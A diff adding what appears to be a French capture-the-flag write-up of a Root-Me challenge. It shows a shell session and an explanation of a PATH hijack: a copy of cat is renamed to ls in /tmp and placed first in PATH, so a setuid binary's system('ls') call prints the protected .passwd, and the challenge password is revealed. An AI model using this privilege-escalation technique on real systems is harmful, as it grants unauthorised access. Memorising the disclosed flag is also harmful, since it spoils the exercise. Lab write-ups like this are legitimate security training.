@@ -1,0 +1,40 @@
+app-script-ch11@challenge02:~$ ls
+ch11  ch11.c
+app-script-ch11@challenge02:~$ ls -l
+total 12
+-r-sr-x--- 1 app-script-ch11-cracked app-script-ch11 7160 Aug 11  2015 ch11
+-r--r----- 1 app-script-ch11         app-script-ch11  153 Aug 11  2015 ch11.c
+app-script-ch11@challenge02:~$ ls /
+bin   challenge  dev  home        initrd.img.old  lost+found  mnt  proc  run   selinux  sys  usr  vmlinuz
+boot  core       etc  initrd.img  lib             media       opt  root  sbin  srv      tmp  var  vmlinuz.old
+app-script-ch11@challenge02:~$ l
+ch11  ch11.c
+app-script-ch11@challenge02:~$ ./ch11
+/challenge/app-script/ch11/.passwd
+app-script-ch11@challenge02:~$ mkdir /tmp/rootme/
+app-script-ch11@challenge02:~$ cp /bin/cat /tmp/rootme/
+app-script-ch11@challenge02:~$ l /tmp/rootme/
+cat
+app-script-ch11@challenge02:~$ mv /tmp/rootme/cat /tmp/rootme/ls
+app-script-ch11@challenge02:~$ PATH=/tmp/rootme/:$PATH
+app-script-ch11@challenge02:~$ ls
+ls: unrecognized option '--color=auto'
+Try `ls --help' for more information.
+app-script-ch11@challenge02:~$ ./ch11
+!oPe96a/.s8d5
+app-script-ch11@challenge02:~$ YIIIIIIIIH =D
+
+**********************************************************************
+
+system(ls .../.passwd); -> execute "ls" sur le fichier ".passwd"
+un "cat" serait plus apprecié
+du coup, on créer dans le "/tmp" un repertoire, par exemple "rootme"
+   -> mkdir /tmp/rootme/
+on y copie le binaire "cat" (where cat -> /bin/cat)
+   -> cp /bin/cat /tmp/rootme/
+on renomme le binaire "cat" par "ls"
+   -> mv /tmp/rootme/cat /tmp/rootme/ls
+et on fait en sorte que le 1er binaire "ls" trouvé a l'execution soit le notre, en modifiant le PATH
+   -> PATH=/tmp/rootme/:$PATH
+Et voila le 1er "ls" trouvé est en realité le binaire "cat" renommer en "ls"
+   -> ./ch11        -> !oPe96a/.s8d5 
